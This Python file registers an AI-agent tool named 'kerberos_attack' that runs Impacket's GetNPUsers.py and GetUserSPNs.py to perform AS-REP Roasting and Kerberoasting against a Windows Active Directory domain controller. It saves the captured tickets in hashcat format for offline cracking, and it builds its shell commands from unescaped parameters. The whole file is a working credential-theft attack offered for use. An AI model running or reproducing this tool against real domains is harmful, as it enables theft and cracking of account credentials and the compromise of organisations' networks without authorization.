#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Kerberos域认证攻击 - AS-REP Roasting(免密凭证提取) + Kerberoasting(服务账号爆破)，Windows AD域渗透必杀技

asrep 走 GetNPUsers.py，只要用户名列表；kerberoast 走 GetUserSPNs.py，必须先有凭据；
auto 看有没有密码/哈希自己选。抓回来的票据统一是 hashcat 格式，可以直接交给
hashcat_bruteforce。
"""

import os

from registry import tool
from utils import run_cmd, fail
from helpers import *  # noqa: F401,F403


@tool(
    "kerberos_attack",
    "Kerberos域认证攻击 - AS-REP Roasting(免密凭证提取) + Kerberoasting(服务账号爆破)，Windows AD域渗透必杀技",
    {
        "properties": {
            "target": {
                "type": "string",
                "description": "域控IP或域名",
            },
            "domain": {
                "type": "string",
                "description": "域名（如 corp.local）",
            },
            "dc_ip": {
                "type": "string",
                "description": "域控IP（必填）",
            },
            "username": {
                "type": "string",
                "description": "已知用户名（AS-REP模式只需要用户名）",
            },
            "password": {
                "type": "string",
                "description": "已知密码（Kerberoasting需要）",
            },
            "hash": {
                "type": "string",
                "description": "NTLM Hash（替代密码）",
            },
            "users_file": {
                "type": "string",
                "description": "用户名列表文件路径（AS-REP批量）",
            },
            "mode": {
                "type": "string",
                "description": "攻击模式: asrep(免密)/kerberoast(需凭据)/auto(自动判断)",
                "default": "auto",
            },
            "output_file": {
                "type": "string",
                "description": "哈希输出文件路径",
                "default": "/tmp/kerberos_hashes.txt",
            },
            "timeout": {
                "type": "integer",
                "description": "超时秒数（默认300）",
                "default": 300,
            },
        },
        "required": ["domain", "dc_ip"],
    },
)
def kerberos_attack_handler(params):
            domain = params.get("domain","")
            dc_ip = params.get("dc_ip","")
            username = params.get("username","")
            password = params.get("password","")
            hash_val = params.get("hash","")
            users_file = params.get("users_file","")
            output_file = params.get("output_file","/tmp/kerberos_hashes.txt")
            mode = params.get("mode","auto")
            timeout = int(params.get("timeout",300))
            if mode in ("asrep","auto") and not password:
                if users_file and os.path.isfile(users_file):
                    return run_cmd(f"GetNPUsers.py {domain}/ -usersfile {users_file} -dc-ip {dc_ip} -format hashcat -outputfile {output_file}", timeout)
                elif username:
                    return run_cmd(f"GetNPUsers.py {domain}/{username} -dc-ip {dc_ip} -format hashcat -outputfile {output_file}", timeout)
            auth = ""
            if password:
                auth = f"{domain}/{username}:{password}"
            elif hash_val:
                auth = f"{domain}/{username} -hashes :{hash_val}"
            if mode in ("kerberoast","auto") and auth:
                return run_cmd(f"GetUserSPNs.py {auth} -dc-ip {dc_ip} -request -outputfile {output_file}", timeout)
            if mode == "auto" and username:
                r1 = run_cmd(f"GetNPUsers.py {domain}/{username} -dc-ip {dc_ip} -format hashcat -outputfile {output_file}", min(60,timeout))
                if "Hashcat" in r1.get("output","") or "AS-REP" in r1.get("output",""):
                    return r1
                if auth: return run_cmd(f"GetUserSPNs.py {auth} -dc-ip {dc_ip} -request -outputfile {output_file}", timeout)
            return fail(f"Kerberos攻击失败: mode={mode}\n"
                        f"AS-REP(免密): 提供 username 或 users_file\n"
                        f"Kerberoast(需凭据): 提供 username+password/hash")
